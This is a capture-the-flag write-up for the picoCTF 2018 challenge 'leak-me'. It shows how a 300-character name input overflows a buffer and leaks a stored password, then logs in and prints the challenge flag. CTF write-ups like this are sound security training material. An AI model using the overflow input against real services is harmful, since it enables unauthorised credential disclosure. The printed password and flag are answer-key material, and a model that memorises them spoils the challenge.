# leak-me
Points: 200

## Category
Binary Exploitation

## Question
>Can you authenticate to this [service](files/auth) and get the flag? Connect with `nc 2018shell1.picoctf.com 31045`. [Source](files/auth.c). 

### Hint
>Are all the system calls being used safely?
>
>Some people can have reallllllly long names you know..

## Solution
By spamming the service with multiple characters, the password from _password.txt_ gets leaked.

```
$ python -c "print 'A' * 300" | nc 2018shell1.picoctf.com 31045
What is your name?
Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA,a_reAllY_s3cuRe_p4s$word_d98e8d

Incorrect Password!
```

Now we can enter in a name and the password obtained.

```
$ nc 2018shell1.picoctf.com 31045
What is your name?
Platy
Hello Platy,
Please Enter the Password.
a_reAllY_s3cuRe_p4s$word_d98e8d
picoCTF{aLw4y5_Ch3cK_tHe_bUfF3r_s1z3_d1667872}
```

Working solution [solve.py](solution/solve.py)

### Flag
`picoCTF{aLw4y5_Ch3cK_tHe_bUfF3r_s1z3_d1667872}`
